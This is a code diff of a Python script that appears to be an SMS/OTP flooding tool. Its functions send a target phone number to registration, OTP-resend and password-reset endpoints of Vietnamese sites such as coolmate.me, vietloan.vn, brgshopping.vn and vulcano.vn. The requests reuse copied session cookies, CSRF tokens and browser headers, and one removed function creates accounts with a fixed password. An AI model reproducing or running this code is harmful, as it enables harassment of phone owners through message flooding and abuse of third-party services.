-        'laravel_session': 'eyJpdiI6IkxYT0loN2tLSEpVeXRDVlZ2QVVpaUE9PSIsInZhbHVlIjoiMXZ0ZmtMbW5idVRGeUtoWmpJb3BMblVkK1dzM0VHK1N4aVlCQ0EzbUxRYko3TnlLUENCYkNQY2d2TkVzRDRRZCIsIm1hYyI6IjZjZGE3OWEyZmFjNDdjYzdiM2JiMWViZjNkMmRjMjA5YjUwZGMzNTA4NjZkNjcxMDA2OGEyNjBmODVjMTc3NTMifQ%3D%3D',
-        'redirect_url': 'eyJpdiI6IkwxQmpzTjFLWFJkakpZczZvc2dobkE9PSIsInZhbHVlIjoiUWFjVWt0YlZzWE5yM1BBb2hBSHd2TDAwaVwvNVVEczcwc3dBRFdQdUJIUEljcjMyUXlEUEZMOWJRVTRJVlh3MHZjVTJoTkN1MzFSemhEcDUwSWtqNUozSk1yOE0wUjJNWVVmbzROOTFvaExIN2R3V2VWVzVyK3l2d004c2lBMG0rdVwvWWk0cFwvNkc1VlFOd05cLzRDUXZ3VkhmN2ZjRjFENGJqSHQ2ZDZuSnRnVUJMakpTV2xkcUFUZWVpV2IxUEhZcVhGbk1MQzFFK3k2RGhDR2tIMysrRDVVUmxnaVFnKzl2a2VLUU9kWmo4NEl4UFBoSUFNcDZYU05Vb1NuRFhmUkpxcEtDTEFBcWxxUFJYQ2RuMWNcL08xNk1hNFNLT2pXTHpFaytvcnFsakdqOD0iLCJtYWMiOiJhODgzNDY3NmRkZWJlYmM1MjYwNjQxZTA4ODY2Nzg1YWQ4ODc0MjIwZDdkMmIyMjUwMzliODA0ZDA5YTlkZGMxIn0%3D',
-    }
-
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/json',
-        # 'cookie': 'device_token=597f946e29e835d88f56392f40ea75c3; box_token=9dbb29f1bd9e93ef4a5f8468ff0b5618; cart_quantity=0; active-voucher1=true; g_state={"i_p":1725246086128,"i_l":4}; affiliate_content=%7B%22time_stamp%22%3A1723354726%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_Search_COM_STA_GP_TVN_01062024_EXACTKEWORDS%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Ftat-vo-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.90.220.68%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221332724879-163056499676-v%5Cu1edb%20tay%20nam%22%2C%22utm_content%22%3A%22700923935895%22%2C%22gclid%22%3A%22Cj0KCQjwn9y1BhC2ARIsAG5IY-4LLvEnGTTKvC3t-KJumETp2sBDpntabX_CQTDiWbXdbv6xHHkYirIaAlkwEALw_wcB%22%7D; XSRF-TOKEN=eyJpdiI6IjlyQjBOY1ZvT2VkQVVnQnVLUkFYSkE9PSIsInZhbHVlIjoiR0NuaHdkeTd5Z2tqTldFV2NDS1Bhc2tRV3E4N0ZTMEI1ZGt4RGxiTjVZZFRTMGhVd0ZWdUNRYzNcL0hnS2tld3oiLCJtYWMiOiI2NWFiNzBkZDQxMzc5NzhhNGQ3ODNhMWRiODI2YmNmMjUzNTQ4MjZiMmQ0MzhiNzBlYTI1YTI5YzQ3YjJhNGMwIn0%3D; laravel_session=eyJpdiI6IkxYT0loN2tLSEpVeXRDVlZ2QVVpaUE9PSIsInZhbHVlIjoiMXZ0ZmtMbW5idVRGeUtoWmpJb3BMblVkK1dzM0VHK1N4aVlCQ0EzbUxRYko3TnlLUENCYkNQY2d2TkVzRDRRZCIsIm1hYyI6IjZjZGE3OWEyZmFjNDdjYzdiM2JiMWViZjNkMmRjMjA5YjUwZGMzNTA4NjZkNjcxMDA2OGEyNjBmODVjMTc3NTMifQ%3D%3D; redirect_url=eyJpdiI6IkwxQmpzTjFLWFJkakpZczZvc2dobkE9PSIsInZhbHVlIjoiUWFjVWt0YlZzWE5yM1BBb2hBSHd2TDAwaVwvNVVEczcwc3dBRFdQdUJIUEljcjMyUXlEUEZMOWJRVTRJVlh3MHZjVTJoTkN1MzFSemhEcDUwSWtqNUozSk1yOE0wUjJNWVVmbzROOTFvaExIN2R3V2VWVzVyK3l2d004c2lBMG0rdVwvWWk0cFwvNkc1VlFOd05cLzRDUXZ3VkhmN2ZjRjFENGJqSHQ2ZDZuSnRnVUJMakpTV2xkcUFUZWVpV2IxUEhZcVhGbk1MQzFFK3k2RGhDR2tIMysrRDVVUmxnaVFnKzl2a2VLUU9kWmo4NEl4UFBoSUFNcDZYU05Vb1NuRFhmUkpxcEtDTEFBcWxxUFJYQ2RuMWNcL08xNk1hNFNLT2pXTHpFaytvcnFsakdqOD0iLCJtYWMiOiJhODgzNDY3NmRkZWJlYmM1MjYwNjQxZTA4ODY2Nzg1YWQ4ODc0MjIwZDdkMmIyMjUwMzliODA0ZDA5YTlkZGMxIn0%3D',
-        'origin': 'https://www.coolmate.me',
-        'priority': 'u=1, i',
-        'referer': 'https://www.coolmate.me/collection/combo-set-do-gia-tot?itm_source=homepage&itm_medium=herobanner_1&itm_campaign=Sale_giua_thang_15_8_-_Destop_-_fix_3&itm_content=/image/August2024/Sale_giua_thang_15_8_-_Destop_-_fix_3.jpg',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-csrf-token': 'rIG6136gGu756xPVgVVrXfLhxZUjZjmatPQ1iU7u',
-    }
-
-    json_data = {
-        'phone': sdt,
-        'type': 'register',
-    }
-
-    try:
-        response = requests.post('https://www.coolmate.me/otp/renew', cookies=cookies, headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("COOLMATERESEND | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("COOLMATERESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
 def vietloan():
     cookies = {
-        'jslbrc': 'w.20240725025025a4a6e770-4a30-11ef-b50d-96d7934ebbe4.A_GS',
-        '__cfruid': '94bcfce67157e886a01124469394f2d98678e632-1722410833',
         '_gcl_au': '1.1.1637479389.1722410837',
-        '_gid': 'GA1.2.249547405.1722410837',
         '_tt_enable_cookie': '1',
         '_ttp': 'BCNl-9LA0i0a8YqJWV2Veir4WGy',
         '_clck': '8x261n%7C2%7Cfnx%7C0%7C1673',
         'mousestats_vi': 'e6c32520217f71487615',
-        'mousestats_si': '3e2a87f99adf896bce1e',
         '_ym_uid': '1722410839843139251',
         '_ym_d': '1722410839',
-        '_ym_isad': '2',
-        '_ym_visorc': 'w',
-        'XSRF-TOKEN': 'eyJpdiI6Ilh0eGx0WFkzempHcUl0SGwxTVBYNUE9PSIsInZhbHVlIjoiR1FMc2R4MFlDRk9nN0FJY1UvckorTitKdmtZRE5MbG9tRDEvTVQ2dWlyOTYzZVVpM3RUUHVMYWhQaGNFd0dwRnRMMVpWNTR3MEdXcFJ1OXJ1N1RUUGM3bXdDNFhLdFh5WktybG9tblZqdnpGWTVpMEs1cStnS045bnR6ZmwrOTgiLCJtYWMiOiI2N2M0OTk2MGU5MTA4ZGJjZGZjNDZhY2MzNWQzOTRhMzU3NDc4OGM3NDQ3NTc4YWRlYzNhOTNlODVmODA2MDEzIiwidGFnIjoiIn0%3D',
-        'sessionid': 'eyJpdiI6IkJRNHFWelAwVHdwWlprTElOWE1xMXc9PSIsInZhbHVlIjoiNXhvbUNuRFdFQThVRTY5eHNBREJwSExYVkxEa0VTZU94VEJRK0tsck1qQ0FydFdzaFRkMEZ5b1pQV25mOEFtR3p5aUZpMGVDYitPaUh3ejZ5dFh0VkRoMTRXdFV1aXhsd21TdWw4UGljQitJWmJiRDVTWXRiOStzZUt1SENqaG8iLCJtYWMiOiI3ZDE4MTY3MmRhMmIzN2YxNDNlMjg0MjFlZDAyZmNiMWJhZGJmOWI1MDY5ZDc2OGYzZjMxNmJiNzVlODY2NDI5IiwidGFnIjoiIn0%3D',
-        'utm_uid': 'eyJpdiI6IktKMjNTNnRqdmx6MEUzV1czcEt6SVE9PSIsInZhbHVlIjoidE9LQ08wbXVldUd4VzMxc1R2V2RTKzJmM25lUXgzYXpXRXFGN3I1OG4xeEJMc212cnlCRXYrNEo3ZnU3QWxUSTJsY0FsUE5mZmtCT3BneFdIU25lb0E3N1djZzJKNlZpUmdZSkNHclZTMGZvMEZaUUNrby9EWHVoa3EyZDBNRzAiLCJtYWMiOiJiNTRlZGVhMTEyMDRlMjI2M2ZjM2ZmYmM2NDMzYjQ2NjI1MzMxOTY1ODE2N2M5N2EyNjI1NWM3ZDUxZTg5OTk4IiwidGFnIjoiIn0%3D',
         '_ga': 'GA1.2.1436947795.1722410837',
-        '_ga_EBK41LH7H5': 'GS1.1.1722410836.1.1.1722410860.36.0.0',
+        '_ga_EBK41LH7H5': 'GS1.1.1722410836.1.1.1722411244.42.0.0',
+        'jslbrc': 'w.202408140926053b0dc43e-5a1f-11ef-96f3-3e52465474e4.A_GS',
+        '__cfruid': 'a92c42afdc79a54e52eeb941a6442eb694e7023d-1724250856',
+        'XSRF-TOKEN': 'eyJpdiI6IldtdXBYSWdvcEdjSm5zLy84b2dBdlE9PSIsInZhbHVlIjoiS3Fadk8rM2ZENWxKN280cTZBNmFYSWhPMmxWdlBmZDV4Z3paNWN6eDVENjl3c3paMHVVOElGOUZKOTJaejNGZlNmN1FtNldhaS9ISTJkeFhhNTNkY1Q4VHhiQTArblQvZ3QwTVV5WDRjMGR4SE9uZ2dTYlp4ak9pZVg3cHl4eTciLCJtYWMiOiI2NjRiOGZiMTBkYWUwYzlkNzQ2ZTZhMTE3ODE0Y2EzZjFkNzkzODA3YTkwM2ZhOWExZjQ2ZjM0NGFhM2I5ZWM5IiwidGFnIjoiIn0%3D',
+        'sessionid': 'eyJpdiI6ImNORWdSVEhaS05XandRQUVZTzVicFE9PSIsInZhbHVlIjoiMThSR0dDWjlzNEUveDZoRGV4MVZtSjNDRm9tZnhLcXRReTM5dXhuRWQ5U1JGR1hXd0ZiVTdKWTZGNlY2Rm9vQjhsempYUTRwV1FUZ0J4N2tSYXREWXRZSnI3c1BvUlMwSWltRWNIT1pyUkYrNG9SdkFHak1FOWt4NXBmd2xMNWsiLCJtYWMiOiI1MTIyYTIyMmRhNjFkNmIwYmE0MmEwYjFlYjM0MzRlODdhYzBkMjFmNGJlYWYxNzdkYmZmZDVkNmEzY2U3NDI5IiwidGFnIjoiIn0%3D',
+        'utm_uid': 'eyJpdiI6Imhyb2dZMUhWbHZIVXF2K1I4aXkvR2c9PSIsInZhbHVlIjoiZTJJbDA0dXR1MkNxaS93Q1gyQ2RWeU42MUlXOTl0ZW9OLzJlYnpETkV6bU9WOGRZQUZTOS9FbFhmNDJ0amVQM2lTcGdHUTlHTTRBbjZCSndVR2ZrclZJdzc4SmVQOHk5S2NJdUFMNGxzU0RnK1BCeGRkc3VKaklNbHp3enBXRlciLCJtYWMiOiJjZjhkMWRkOTQ3NjE5MTViOTVjYTFkOGM0OTA2MGNhMWQ5MTE3MjVkMGEyMTNiOWQ5YmVlYWJlNDgyNTJjZWU0IiwidGFnIjoiIn0%3D',
         'ec_png_utm': '632e6101-b428-93c3-3898-ca177175bb79',
         'ec_png_client': 'false',
         'ec_png_client_utm': 'null',
@@ -3739,7 +2984,6 @@ def vietloan():
         'ec_etag_utm': '632e6101-b428-93c3-3898-ca177175bb79',
         'ec_etag_client': 'false',
         'ec_etag_client_utm': 'null',
-        '_clsk': '9762wf%7C1722410862712%7C1%7C1%7Cr.clarity.ms%2Fcollect',
         'uid': '632e6101-b428-93c3-3898-ca177175bb79',
         'client': 'false',
         'client_utm': 'null',
@@ -3749,7 +2993,7 @@ def vietloan():
         'accept': '*/*',
         'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': 'jslbrc=w.20240725025025a4a6e770-4a30-11ef-b50d-96d7934ebbe4.A_GS; __cfruid=94bcfce67157e886a01124469394f2d98678e632-1722410833; _gcl_au=1.1.1637479389.1722410837; _gid=GA1.2.249547405.1722410837; _tt_enable_cookie=1; _ttp=BCNl-9LA0i0a8YqJWV2Veir4WGy; _clck=8x261n%7C2%7Cfnx%7C0%7C1673; mousestats_vi=e6c32520217f71487615; mousestats_si=3e2a87f99adf896bce1e; _ym_uid=1722410839843139251; _ym_d=1722410839; _ym_isad=2; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6Ilh0eGx0WFkzempHcUl0SGwxTVBYNUE9PSIsInZhbHVlIjoiR1FMc2R4MFlDRk9nN0FJY1UvckorTitKdmtZRE5MbG9tRDEvTVQ2dWlyOTYzZVVpM3RUUHVMYWhQaGNFd0dwRnRMMVpWNTR3MEdXcFJ1OXJ1N1RUUGM3bXdDNFhLdFh5WktybG9tblZqdnpGWTVpMEs1cStnS045bnR6ZmwrOTgiLCJtYWMiOiI2N2M0OTk2MGU5MTA4ZGJjZGZjNDZhY2MzNWQzOTRhMzU3NDc4OGM3NDQ3NTc4YWRlYzNhOTNlODVmODA2MDEzIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IkJRNHFWelAwVHdwWlprTElOWE1xMXc9PSIsInZhbHVlIjoiNXhvbUNuRFdFQThVRTY5eHNBREJwSExYVkxEa0VTZU94VEJRK0tsck1qQ0FydFdzaFRkMEZ5b1pQV25mOEFtR3p5aUZpMGVDYitPaUh3ejZ5dFh0VkRoMTRXdFV1aXhsd21TdWw4UGljQitJWmJiRDVTWXRiOStzZUt1SENqaG8iLCJtYWMiOiI3ZDE4MTY3MmRhMmIzN2YxNDNlMjg0MjFlZDAyZmNiMWJhZGJmOWI1MDY5ZDc2OGYzZjMxNmJiNzVlODY2NDI5IiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IktKMjNTNnRqdmx6MEUzV1czcEt6SVE9PSIsInZhbHVlIjoidE9LQ08wbXVldUd4VzMxc1R2V2RTKzJmM25lUXgzYXpXRXFGN3I1OG4xeEJMc212cnlCRXYrNEo3ZnU3QWxUSTJsY0FsUE5mZmtCT3BneFdIU25lb0E3N1djZzJKNlZpUmdZSkNHclZTMGZvMEZaUUNrby9EWHVoa3EyZDBNRzAiLCJtYWMiOiJiNTRlZGVhMTEyMDRlMjI2M2ZjM2ZmYmM2NDMzYjQ2NjI1MzMxOTY1ODE2N2M5N2EyNjI1NWM3ZDUxZTg5OTk4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1436947795.1722410837; _ga_EBK41LH7H5=GS1.1.1722410836.1.1.1722410860.36.0.0; ec_png_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_etag_client=false; ec_etag_client_utm=null; _clsk=9762wf%7C1722410862712%7C1%7C1%7Cr.clarity.ms%2Fcollect; uid=632e6101-b428-93c3-3898-ca177175bb79; client=false; client_utm=null',
+        # 'cookie': '_gcl_au=1.1.1637479389.1722410837; _tt_enable_cookie=1; _ttp=BCNl-9LA0i0a8YqJWV2Veir4WGy; _clck=8x261n%7C2%7Cfnx%7C0%7C1673; mousestats_vi=e6c32520217f71487615; _ym_uid=1722410839843139251; _ym_d=1722410839; _ga=GA1.2.1436947795.1722410837; _ga_EBK41LH7H5=GS1.1.1722410836.1.1.1722411244.42.0.0; jslbrc=w.202408140926053b0dc43e-5a1f-11ef-96f3-3e52465474e4.A_GS; __cfruid=a92c42afdc79a54e52eeb941a6442eb694e7023d-1724250856; XSRF-TOKEN=eyJpdiI6IldtdXBYSWdvcEdjSm5zLy84b2dBdlE9PSIsInZhbHVlIjoiS3Fadk8rM2ZENWxKN280cTZBNmFYSWhPMmxWdlBmZDV4Z3paNWN6eDVENjl3c3paMHVVOElGOUZKOTJaejNGZlNmN1FtNldhaS9ISTJkeFhhNTNkY1Q4VHhiQTArblQvZ3QwTVV5WDRjMGR4SE9uZ2dTYlp4ak9pZVg3cHl4eTciLCJtYWMiOiI2NjRiOGZiMTBkYWUwYzlkNzQ2ZTZhMTE3ODE0Y2EzZjFkNzkzODA3YTkwM2ZhOWExZjQ2ZjM0NGFhM2I5ZWM5IiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6ImNORWdSVEhaS05XandRQUVZTzVicFE9PSIsInZhbHVlIjoiMThSR0dDWjlzNEUveDZoRGV4MVZtSjNDRm9tZnhLcXRReTM5dXhuRWQ5U1JGR1hXd0ZiVTdKWTZGNlY2Rm9vQjhsempYUTRwV1FUZ0J4N2tSYXREWXRZSnI3c1BvUlMwSWltRWNIT1pyUkYrNG9SdkFHak1FOWt4NXBmd2xMNWsiLCJtYWMiOiI1MTIyYTIyMmRhNjFkNmIwYmE0MmEwYjFlYjM0MzRlODdhYzBkMjFmNGJlYWYxNzdkYmZmZDVkNmEzY2U3NDI5IiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6Imhyb2dZMUhWbHZIVXF2K1I4aXkvR2c9PSIsInZhbHVlIjoiZTJJbDA0dXR1MkNxaS93Q1gyQ2RWeU42MUlXOTl0ZW9OLzJlYnpETkV6bU9WOGRZQUZTOS9FbFhmNDJ0amVQM2lTcGdHUTlHTTRBbjZCSndVR2ZrclZJdzc4SmVQOHk5S2NJdUFMNGxzU0RnK1BCeGRkc3VKaklNbHp3enBXRlciLCJtYWMiOiJjZjhkMWRkOTQ3NjE5MTViOTVjYTFkOGM0OTA2MGNhMWQ5MTE3MjVkMGEyMTNiOWQ5YmVlYWJlNDgyNTJjZWU0IiwidGFnIjoiIn0%3D; ec_png_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_etag_client=false; ec_etag_client_utm=null; uid=632e6101-b428-93c3-3898-ca177175bb79; client=false; client_utm=null',
         'origin': 'https://vietloan.vn',
         'priority': 'u=1, i',
         'referer': 'https://vietloan.vn/register',
@@ -3765,7 +3009,7 @@ def vietloan():
 
     data = {
         'phone': sdt,
-        '_token': 'Fh2qJ1nzCevC64qwn8dWINt1Nw0ykTSrpDEABcBU',
+        '_token': '0imETpMzV9778TbjNqH6dpOwfTq7hY475G0hXJm3',
     }
 
     try:
@@ -4251,51 +3495,6 @@ def richvn():
     except requests.exceptions.RequestException:
         print("RICHVN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
-def brgshopping():
-    cookies = {
-        'frontend_lang': 'vi_VN',
-        'brgshopping.vn': 'brgshopping.vn',
-        'brg_cookie_popup': 'xxxxxxxxxxx',
-        'session_id': '99afa4f7b7fb49a2a12cfa5eaa78e866fb90136a',
-    }
-
-    headers = {
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'Cache-Control': 'max-age=0',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        # 'Cookie': 'frontend_lang=vi_VN; brgshopping.vn=brgshopping.vn; brg_cookie_popup=xxxxxxxxxxx; session_id=99afa4f7b7fb49a2a12cfa5eaa78e866fb90136a',
-        'Origin': 'https://brgshopping.vn',
-        'Referer': 'https://brgshopping.vn/web/signup',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-User': '?1',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-
-    data = {
-        'csrf_token': '6b3ae11de46aadc384265ad16747be93c6a96b2eo1723707360',
-        'login': sdt,
-        'name': 'John Davis',
-        'password': '123123aA@',
-        'confirm_password': '123123aA@',
-        'redirect': '',
-        'token': '',
-    }
-
-    try:
-        response = requests.post('https://brgshopping.vn/web/signup', cookies=cookies, headers=headers, data=data, verify=False)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("BRGSHOPPING | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("BRGSHOPPING | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
 def nativex():
     headers = {
         'accept': '*/*',
@@ -4779,136 +3978,6 @@ def hoasenhome():
     except requests.exceptions.RequestException:
         print("HOASENHOME | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
-def vulcano():
-    cookies = {
-        'XSRF-TOKEN': 'eyJpdiI6IkJ6Q2tWTzFybXAyU3V1UEVwYlBkM0E9PSIsInZhbHVlIjoiU2ZWd3cxSDVLdkVVMlB3dUZSQVBxNXFNcm9sVkYwTmhsOWY1V1BzajZBVFpOT0RGVU5aRm45M1MyQk9SYjhMU0JBWHRPaEhkeWZCT2hCZjdJbnd5SmE0Y0dDN2NaOTUwUzlHcEU1Qlhmc2JDSENXbG5QYW1GS3Z0aUlHazdUOEYiLCJtYWMiOiJmNmY4NzgxZjY5MzgwZWFkY2MxMDJiOTdlMDE5ZWQzOTEwZTI1YzMzNmUzMWQ0ZTU4YTc0YmZiZGEyZDk3YmU5IiwidGFnIjoiIn0%3D',
-        'vulcanovn_session': 'eyJpdiI6InNqK3ZGZ3Z1OGQ3SG03aWVhRXJ6Znc9PSIsInZhbHVlIjoiMThzZ0llcXhNTTBzaTRZYlNyVlRPS0o4K1BqNnI4T0lNSXRaT0cycFpJRms1dS9qNFRIN0FUZnZPSm4rRW9TazJZR013WG1FeWxjU0pjWHFYOHRVd1hIRG9LbngzNFNPMWtNUXAxdGIxWkR6bGJkcklldXlpVVBWNm9oRytXaUwiLCJtYWMiOiJkYzFjZDAyODA0YzM0MzkxYjcxMWIyMDgyNjc3Y2Y3ZDAxMzVjMTIwZGE0YTFiNmUwNmVjZmQ1ZGM1ZjBiMzM5IiwidGFnIjoiIn0%3D',
-        'utm_values': 'eyJpdiI6Ii9DS0t3SDRQZHdSME9RLzJUTlVadXc9PSIsInZhbHVlIjoiUWxodC9zUnl4SkVVOGFZY3QvUmVmZnhBUHhDSzl1NGx1K2gyV0ZqUjFkTEQxeVdVR0lNQ0dna3R3dmVFQmYvVyIsIm1hYyI6IjQ0NjNkZDMzMThkNTVmNjAwYmYzMTJmYTBhODk5NjM2NGIxZDczNGI5NGRlYWZlYmMxYWMzYWU4NjkzNGY5MGUiLCJ0YWciOiIifQ%3D%3D',
-    }
-
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IkJ6Q2tWTzFybXAyU3V1UEVwYlBkM0E9PSIsInZhbHVlIjoiU2ZWd3cxSDVLdkVVMlB3dUZSQVBxNXFNcm9sVkYwTmhsOWY1V1BzajZBVFpOT0RGVU5aRm45M1MyQk9SYjhMU0JBWHRPaEhkeWZCT2hCZjdJbnd5SmE0Y0dDN2NaOTUwUzlHcEU1Qlhmc2JDSENXbG5QYW1GS3Z0aUlHazdUOEYiLCJtYWMiOiJmNmY4NzgxZjY5MzgwZWFkY2MxMDJiOTdlMDE5ZWQzOTEwZTI1YzMzNmUzMWQ0ZTU4YTc0YmZiZGEyZDk3YmU5IiwidGFnIjoiIn0%3D; vulcanovn_session=eyJpdiI6InNqK3ZGZ3Z1OGQ3SG03aWVhRXJ6Znc9PSIsInZhbHVlIjoiMThzZ0llcXhNTTBzaTRZYlNyVlRPS0o4K1BqNnI4T0lNSXRaT0cycFpJRms1dS9qNFRIN0FUZnZPSm4rRW9TazJZR013WG1FeWxjU0pjWHFYOHRVd1hIRG9LbngzNFNPMWtNUXAxdGIxWkR6bGJkcklldXlpVVBWNm9oRytXaUwiLCJtYWMiOiJkYzFjZDAyODA0YzM0MzkxYjcxMWIyMDgyNjc3Y2Y3ZDAxMzVjMTIwZGE0YTFiNmUwNmVjZmQ1ZGM1ZjBiMzM5IiwidGFnIjoiIn0%3D; utm_values=eyJpdiI6Ii9DS0t3SDRQZHdSME9RLzJUTlVadXc9PSIsInZhbHVlIjoiUWxodC9zUnl4SkVVOGFZY3QvUmVmZnhBUHhDSzl1NGx1K2gyV0ZqUjFkTEQxeVdVR0lNQ0dna3R3dmVFQmYvVyIsIm1hYyI6IjQ0NjNkZDMzMThkNTVmNjAwYmYzMTJmYTBhODk5NjM2NGIxZDczNGI5NGRlYWZlYmMxYWMzYWU4NjkzNGY5MGUiLCJ0YWciOiIifQ%3D%3D',
-        'origin': 'https://vulcano.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://vulcano.vn/register',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-csrf-token': '9Dhr621QSdLEIjaiPEWHx7SUutyy28qa30K6ddsd',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data = {
-        'phone': sdt,
-    }
-
-    try:
-        response = requests.post('https://vulcano.vn/verify/send/code/register', cookies=cookies, headers=headers, data=data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("VULCANO | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("VULCANO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-        print(response.text)
-
-def vulcanoreset():
-    cookies = {
-        'XSRF-TOKEN': 'eyJpdiI6InFORmE5Yzc2Q0hOOTRLS1JtbjFvRnc9PSIsInZhbHVlIjoiRnU1Qy9sdnI5WnlZZ1VYSU9XMVR1eUtNeUhlYWRac2N5dHljakVmRmRXMjlaQUlmMWFtY3AyVEdRVitHcVNJSFpldUV4ajQ4UC91NnFxS0NBZ21lRUNkeGlYSGxhTDFjYXFUOWRobStUOGhiWk5mM3dtV3hwZjE1R2lzaDdwQlkiLCJtYWMiOiI2YTA5NjQwYzllNGE2ZTQyM2JmMzdlY2M5NTJkMmRhZDJjNGFjY2VhNzRiMWYyMTExZmVjNzE5ODMyZTgwM2JkIiwidGFnIjoiIn0%3D',
-        'vulcanovn_session': 'eyJpdiI6IjhIZ3krcHZOK3F5OWx2VVVvd0Y1cmc9PSIsInZhbHVlIjoiaWJhWnM4VUN0SDE2MnlDYTlMSFVHRzFlYnVXZ1BqNWJsYk5Cblk3ckR4ZGdwVVVCQmxOMzhvL3ZGWUgvbitZaTdnbnU3STB3Yzc0OFZpWElHUnJQeVp1bFVldGVlTlZBS0kzZGtNQ2ptMmdhUDVFckFTUjUyWVBsbTgwSUdDOTQiLCJtYWMiOiI2ZTMyZjQ2ZjFhYmY5ZjQ0MTQzNjAzMGI5Mjg3NjM2NjkyNWNhMTAxZWI0NDFiYzkwMDhmZTdlYjMzZjhlYjA4IiwidGFnIjoiIn0%3D',
-        'utm_values': 'eyJpdiI6IkQ2dHVKT3poMkhkMUlQY2NmMHNLNmc9PSIsInZhbHVlIjoidndvekp5aU8zYmpoaWt4ZVZCVHF0KzMwTlQrdklWMThvNXZydnlwbDV3VW9Fa3Z0Z3FrOEY2N1gwMjNGbGxNTSIsIm1hYyI6ImRjNDQ1MWZmOTQ3ZGNmYjhjNzFiMDk0NmY4MzZiMDg2ZjgxMTZkMDkxOTJkNTJlMDRlZTQxNjM1ZDhlYjAzYmYiLCJ0YWciOiIifQ%3D%3D',
-    }
-
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'cache-control': 'max-age=0',
-        'content-type': 'application/x-www-form-urlencoded',
